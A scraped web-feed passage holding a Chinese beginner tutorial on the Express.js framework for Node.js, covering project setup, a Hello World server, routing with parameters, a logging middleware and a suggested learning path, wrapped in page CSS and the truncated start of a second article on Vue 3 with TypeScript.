24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="darcula">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#bababa}.hljs-emphasis,.hljs-strong{color:#a8a8a2}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#6896ba}.hljs-code,.hljs-selector-class{color:#a6e22e}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#cb7832}.hljs-params{color:#b9b9b9}.hljs-string{color:#6a8759}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable,.hljs-type{color:#e0c46c}.hljs-comment,.hljs-deletion,.hljs-meta{color:#7f7f7f}</style><p>还记得我第一次用Node.js写后端时的窘境：想处理一个简单的GET请求，翻了半天文档才凑出几十行代码，还因为没处理好请求头报了一堆错。直到前辈扔给我一句"试试Express"，我才发现后端开发原来能这么省心。这个在Node.js生态里活跃了十几年的"老伙计"，至今仍是数百万开发者的入门首选——不是因为它多新潮，而是因为它把复杂的Web开发逻辑，梳理得像奶茶里的珍珠一样清晰。</p>
<h2 data-id="heading-0">先搞懂：Express到底是什么？</h2>
<p>如果把Node.js比作一辆能跑的汽车，那Express就是一套现成的操控系统。它是基于Node.js的轻量级Web框架，没有给汽车换引擎，只是把方向盘、油门、刹车都设计得顺手又好懂。你不用再从零搭建HTTP服务器，不用手动解析请求参数，这些重复又繁琐的工作，Express都帮你封装成了简单的API。</p>
<p>有人说它是"Node.js的事实标准框架"，这话一点不夸张。GitHub上43k+的星标，每周超1000万次的npm下载量，还有StackOverflow上百万条相关问题，都证明了它的地位。就像Postman的早期原型、很多小程序的后端接口，都是用它搭起来的。它就像编程界的"白衬衫"，看似普通却百搭实用，不管是小demo还是中型系统都能hold住。</p>
<p>但它也不是完美的——版本更新慢，v4从2014年用到现在，v5的正式版迟迟不见踪影；面对Fastify这些后起之秀，性能也显得有些吃力。可就像老手艺一样，它的稳定、资料多、入门门槛低，仍是新手绕不开的选择。</p>
<h2 data-id="heading-1">上手实操：从"Hello World"开始</h2>
<p>别被"框架"两个字吓到，用Express写第一个程序，比泡一杯速溶咖啡还简单。前提是你已经装好了Node.js，接下来跟着步骤走，5分钟就能看到成果。</p>
<h3 data-id="heading-2">第一步：搭建项目环境</h3>
<p>先在电脑上建个文件夹，比如叫"my-first-express"，然后打开终端进入这个文件夹。依次输入下面两条命令：</p>
<pre><code class="hljs language-csharp" lang="csharp">npm <span class="hljs-keyword">init</span> -y  <span class="hljs-meta"># 初始化项目，生成package.json文件</span>
npm install express  <span class="hljs-meta"># 安装Express框架</span>
</code></pre>
<p>第一条命令会帮你创建项目配置文件，"-y"表示全部用默认设置，不用挨个确认；第二条命令则是把Express下载到项目里，就像给手机装APP一样。</p>
<h3 data-id="heading-3">第二步：写核心代码</h3>
<p>在文件夹里新建一个叫"app.js"的文件，这就是我们的核心代码文件。把下面这段代码复制进去，我会逐行给你解释：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 把Express框架"请"进来</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>)
<span class="hljs-comment">// 2. 创建一个Express应用实例，就像打开了一个服务窗口</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()
<span class="hljs-comment">// 3. 定义服务器要监听的端口，3000是开发常用端口</span>
<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>

<span class="hljs-comment">// 4. 定义路由：当有人访问根路径"/"时，返回"Hello World!"</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">'Hello World! 这是我的第一个Express应用'</span>)
})

<span class="hljs-comment">// 5. 启动服务器，开始监听3000端口</span>
app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`服务器跑起来啦！访问地址：http://localhost:<span class="hljs-subst">${port}</span>`</span>)
})
</code></pre>
<p>这里的关键是"路由"——它就像餐厅里的点餐系统，客人点了鱼香肉丝（访问"/"路径），厨房就按菜单做对应的菜（返回指定内容）。req是客人的需求（请求信息），res是厨房的回应（响应内容），通过这两个对象就能完成前后端的对话。</p>
<h3 data-id="heading-4">第三步：启动服务，见证成果</h3>
<p>在终端输入这条命令：</p>
<pre><code class="hljs">node app.js
</code></pre>
<p>如果看到"服务器跑起来啦！"的提示，就说明成功了。现在打开浏览器，输入"<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000" target="_blank" title="http://localhost:3000" ref="nofollow noopener noreferrer">http://localhost:3000</a>" ，页面上会清晰地显示我们写的那句话。是不是比直接用Node.js原生代码简单太多？</p>
<p>对了，要是想改响应内容，直接修改res.send()里的字符串就行；想停止服务，在终端按Ctrl+C就好。</p>
<h2 data-id="heading-5">核心技能：搞懂路由和中间件</h2>
<p>学会Hello World只是刚进门，Express的灵魂其实是路由和中间件。掌握这两个东西，你就能搭建真正能用的后端服务了。</p>
<h3 data-id="heading-6">1. 路由：给不同请求分好工</h3>
<p>实际开发中，我们不可能只有一个根路径。比如做一个博客，需要有文章列表、文章详情、提交评论等功能，这就需要定义多个路由。</p>
<p>在app.js里继续添加这些代码，就能实现不同路径的访问：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 文章列表页面，GET请求</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/articles'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">'这是文章列表，有10篇文章'</span>)
})

<span class="hljs-comment">// 单篇文章详情，路径里的:id是动态参数</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/articles/:id'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// 通过req.params获取动态参数</span>
  <span class="hljs-keyword">const</span> articleId = req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`这是第<span class="hljs-subst">${articleId}</span>篇文章的详情`</span>)
})

<span class="hljs-comment">// 提交评论，POST请求</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/comments'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">'评论提交成功！'</span>)
})
</code></pre>
<p>现在访问"<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A3000%2Farticles%2F5" target="_blank" title="http://localhost:3000/articles/5" ref="nofollow noopener noreferrer">http://localhost:3000/articles/5</a>" ，会显示"这是第5篇文章的详情"；访问"/articles"会显示文章列表。这里要注意，路由匹配是按顺序来的，要是把动态路由写在固定路由前面，可能会出现匹配错误，这点一定要记牢。</p>
<p>如果路由太多，都堆在app.js里会很乱。这时候可以用express.Router()做模块化拆分，把路由单独放在一个文件里，就像把不同科目笔记分开记一样，清晰又好维护。</p>
<h3 data-id="heading-7">2. 中间件：请求的"中转站"</h3>
<p>中间件是Express最精妙的设计，我更愿意叫它"请求的加工厂"。比如污水处理需要过滤、沉淀、消毒三个步骤，中间件就是处理请求的这些步骤——在请求到达最终路由前，先做一些预处理，比如验证登录、记录日志、解析参数等。</p>
<p>举个简单的例子，我们做一个日志中间件，记录每次请求的时间和路径：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 定义日志中间件</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">logger</span> = (<span class="hljs-params">req, res, next</span>) =&gt; {
  <span class="hljs-keyword">const</span> time = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toLocaleString</span>()
  <span class="hljs-keyword">const</span> path = req.<span class="hljs-property">path</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${time}</span>] 有人访问了：<span class="hljs-subst">${path}</span>`</span>)
  <span class="hljs-comment">// 必须调用next()，否则请求会卡在中间件里</span>
  <span class="hljs-title function_">next</span>()
}

<span class="hljs-comment">// 注册全局中间件，所有请求都会经过它</span>
app.<span class="hljs-title function_">use</span>(logger)
</code></pre>
<p>把这段代码放在路由定义之前，再启动服务访问任意路径，终端就会显示访问时间和路径。这里的next()特别重要，就像接力赛的交接棒，把请求传递给下一个中间件或路由，要是忘了写，请求就会"迷路"。</p>
<p>中间件还能做很多事，比如身份验证——只有登录的用户才能访问某些路由。不过这里有个坑：要是把中间件挂载在根路径"/"，它会作用于所有请求，可能导致访问首页都需要登录。解决办法是给路由分个专属路径，比如把需要验证的路由都放在"/admin"下面，只给这个路径挂载验证中间件。</p>
<h2 data-id="heading-8">最后：Express的学习路径</h2>
<p>如果你刚入门，不用急着追求复杂功能，按这个步骤学就好：</p>
<ol>
<li>先掌握基础路由（GET/POST）和res的常用方法（send/json/render）；</li>
<li>学习中间件的使用，比如解析JSON请求体的express.json()、处理静态文件的express.static()；</li>
<li>尝试路由模块化，把代码拆分成不同文件；</li>
<li>结合数据库（比如MongoDB），实现数据的增删改查；</li>
<li>最后学习错误处理，让你的服务更健壮。</li>
</ol>
<p>Express就像一位话不多但经验丰富的老师傅，它不会强迫你用某种固定模式，而是给你足够的自由去发挥。虽然现在有Fastify、Koa这些更现代的框架，但把Express学扎实，就像打好编程的地基，以后再学其他框架会轻松很多。</p>
<p>别再犹豫了，打开终端，敲下那行npm install express，开启你的后端开发之旅吧。毕竟，最好的学习方式，就是动手去做。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue3+ts 封装一个通用流程复用工具函数]]></title>    <link>https://juejin.cn/post/7575458028255166507</link>    <guid>https://juejin.cn/post/7575458028255166507</guid>    <pubDate>2025-11-23T16:01:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575458028255166507" data-draft-id="7565324922907852835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue3+ts 封装一个通用流程复用工具函数"/> <meta itemprop="keywords" content="前端,Vue.js,设计"/> <meta itemprop="datePublished" content="2025-11-23T16:01:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="inCBle"/> <meta itemprop="url" content="https://juejin.cn/user/2313807346271560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue3+ts 封装一个通用流程复用工具函数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2313807346271560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    inCBle
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T16:01:50.000Z" title="Sun Nov 23 2025 16:01:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 